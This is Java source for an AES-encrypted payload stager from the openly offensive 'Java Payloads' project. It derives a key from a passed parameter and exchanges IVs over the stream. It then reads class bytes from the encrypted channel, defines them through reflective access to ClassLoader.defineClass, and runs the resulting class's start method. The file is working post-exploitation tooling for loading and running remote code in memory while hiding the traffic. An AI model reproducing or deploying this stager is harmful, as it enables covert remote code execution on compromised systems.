/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, 2011 Michael 'mihi' Schierl.
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
package javapayload.stage;

import java.io.DataInputStream;
import java.io.FilterOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintStream;
import java.lang.reflect.Method;
import java.security.MessageDigest;
import java.security.ProtectionDomain;
import java.security.SecureRandom;
import java.util.Random;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.CipherOutputStream;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class AESHelper extends FilterOutputStream {

	public static void go(Object[] obj) throws Exception {
		go((DataInputStream) obj[0], (OutputStream) obj[1], (String[]) obj[2], (ProtectionDomain) obj[3], (ClassLoader) obj[4], (Random) obj[5]);
	}

	private static void go(DataInputStream in, OutputStream out, String[] parameters, ProtectionDomain pd, ClassLoader thiz, Random r) throws Exception {
		String[] newParameters = (String[]) parameters.clone();
		String key = null;
		for (int i = 0; i < parameters.length - 3; i++) {
			if (parameters[i].equals("--") && parameters[i + 1].equals("AES")) {
				key = parameters[i + 2];
				newParameters[i] = "AES";
				newParameters[i + 1] = key;
				newParameters[i + 2] = "--";
				break;
			}
		}
		SecureRandom sr = new SecureRandom();
		byte[] outIV = new byte[16];
		sr.nextBytes(outIV);
		out.write(outIV);
		out.flush();
		byte[] inIV = new byte[16];
		in.readFully(inIV);
		for (int i = 0; i < inIV.length; i++) {
			inIV[i] ^= r.nextInt(256);
		}
		for (int i = 0; i < outIV.length; i++) {
			outIV[i] ^= r.nextInt(256);
		}
		MessageDigest md5 = MessageDigest.getInstance("MD5");
		md5.update(key.getBytes());
		byte[] rbytes = new byte[32];
		r.nextBytes(rbytes);
		byte[] keyBytes = md5.digest(rbytes);
		Cipher co = Cipher.getInstance("AES/CFB8/NoPadding");
		co.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(keyBytes, "AES"), new IvParameterSpec(outIV), sr);
		Cipher ci = Cipher.getInstance("AES/CFB8/NoPadding");
		ci.init(Cipher.DECRYPT_MODE, new SecretKeySpec(keyBytes, "AES"), new IvParameterSpec(inIV), sr);
		bootstrap(thiz, new CipherInputStream(in, ci), new AESHelper(new CipherOutputStream(out, co)), newParameters, pd);
	}

	private static final void bootstrap(ClassLoader thiz, InputStream rawIn, OutputStream out, String[] parameters, ProtectionDomain pd) throws Exception {
		try {
			Method defi = ClassLoader.class.getDeclaredMethod("defineClass", new Class[] { String.class, byte[].class, int.class, int.class, ProtectionDomain.class });
			defi.setAccessible(true);
			final DataInputStream in = new DataInputStream(rawIn);
			Class clazz;
			int length = in.readInt();
			do {
				final byte[] classfile = new byte[length];
				in.readFully(classfile);
				clazz = (Class) defi.invoke(thiz, new Object[] { null, classfile, new Integer(0), new Integer(length), pd });
				length = in.readInt();
			} while (length > 0);
			final Object stage = clazz.newInstance();
			clazz.getMethod("start", new Class[] { DataInputStream.class, OutputStream.class, String[].class }).invoke(stage, new Object[] { in, out, parameters });
		} catch (final Throwable t) {
			t.printStackTrace(new PrintStream(out, true));
		}
	}
	

	public AESHelper(OutputStream out) {
		super(out);
	}
	
	public synchronized void write(byte[] b) throws IOException {
		super.write(b);
	}	
	public synchronized void write(byte[] b, int off, int len) throws IOException {
		super.write(b, off, len);
	}
	public synchronized void write(int b) throws IOException {
		super.write(b);
	}
	public synchronized void flush() throws IOException {
		super.flush();
	}
	public synchronized void close() throws IOException {
		super.close();
	}
}
